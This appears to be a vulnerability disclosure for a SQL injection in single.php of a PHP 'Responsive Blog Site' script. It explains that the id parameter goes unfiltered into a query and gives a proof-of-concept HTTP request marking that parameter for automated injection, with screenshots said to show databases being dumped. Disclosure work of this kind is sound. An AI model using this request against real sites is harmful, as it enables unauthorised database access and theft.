# Responsive Blog Site has sql injection in single.php

## supplier 
https://code-projects.org/responsive-blog-site-in-php-with-source-code/
## Vulnerability file
single.php

## describe

**Code analysis**   

In the single.php file of Responsive Blog Site, the id parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/images/20250615184604.png)


## POC

```
GET /resblog/resblog/single.php?id=4* HTTP/1.1
Host: Responsive Blog Site
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=ecmd5kmr6te8fpgjnri7c4up85
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/images/5b7f574b-9a23-4c9c-9538-e48daa66400f.png)
Get databases
![image-2025](https://github.com/asd1238525/cve/blob/main/images/05ff12eb-10a4-492d-bfeb-80596af06)